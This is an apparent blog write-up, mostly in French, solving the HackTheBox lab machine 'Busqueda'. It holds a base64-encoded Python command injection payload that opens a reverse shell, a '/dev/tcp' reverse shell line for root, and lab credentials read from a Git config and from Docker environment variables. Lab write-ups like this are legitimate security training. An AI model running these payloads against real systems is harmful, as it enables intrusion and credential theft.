---
title: HTB | Busqueda
description: Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user's Gitea account. Further analysis of the system checkup script&amp;amp;amp;#039;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.
slug: busqueda-htb
date: 2024-12-11 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Busqueda cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Busqueda</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.208</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
nmap -sC -sV -An -p- 10.10.11.208
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
```

## Foothold

### Python Command injection
```bash
## exploit
',__import__('os').system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvOTAwMSAwPiYx | base64 -d | bash -i')) # junky comment

$ nc -lnvp 9001
svc@busqueda:~$ cat user.txt 
afb3.....29e5
```

### Gitea : svc password
On peut voir que l'application a un .git et est donc un repo git. On recupère le lien vers le serveur gitea.searcher.htb. Dans le fichier de config de .git on trouve des credentials pour le nouveau site web découvert qui tourne sur le port 3000

```bash
svc@busqueda:/var/www/app$ git log
commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 (HEAD -> main, origin/main)

Author: administrator <administrator@gitea.searcher.htb> # <---------------- "gitea.searcher.htb"

Date:   Sun Dec 25 12:14:21 2022 +0000

    Initial commit
svc@busqueda:/var/www/app/$ cd .git

## credentials
svc@busqueda:/var/www/app/.git$ cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```
En vérité j'ai trouvé les creds comme ça:
```bash
 grep -rni "gitea"
app/.git/logs/HEAD:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000	commit (initial): Initial commit
app/.git/logs/refs/heads/main:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000	commit (initial): Initial commit
app/.git/logs/refs/remotes/origin/main:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000	update by push

## ICI
app/.git/config:7:	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```
User:
`cody`:`jh1usoih2bkjaspwe92`

On essaye de se connecter en ssh avec cody, puis avec svc et le password de cody, et ca fonctionne !
```bash
ssh svc@10.10.11.208
```


## Root Privilege Escalation
```bash
$ sudo -l
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
On peut voir que lorsqu'on execute system-checkup on peut voir des containers docker, et envoyer des commande spour obtenir
plus d'informations
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py aaaa
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   23 months ago   Up 7 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   23 months ago   Up 7 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config.Env}}' mysql_db
["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"]
```
On trouve le mot de passe root dans les variables d'environnement du docker mysql.

Ce mot de passe peut etre utilisé pour le compte `administrator` sur le site web gitea.searcher.htb !

On peut voir un nouveau repo git avec le code complet du fameux script system-checkup.py

```bash
svc@busqueda:~$ vim full-checkup.sh
##!/bin/bash
cat /root/root.txt

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
52e6.....04a7

[+] Done !
```

On peut aussi utiliser un reverse shell avec ce code pour `full-checkup.sh`:
```bash
##!/bin/bash
sh -i >& /dev/tcp/10.10.16.10/9001 0>&1
```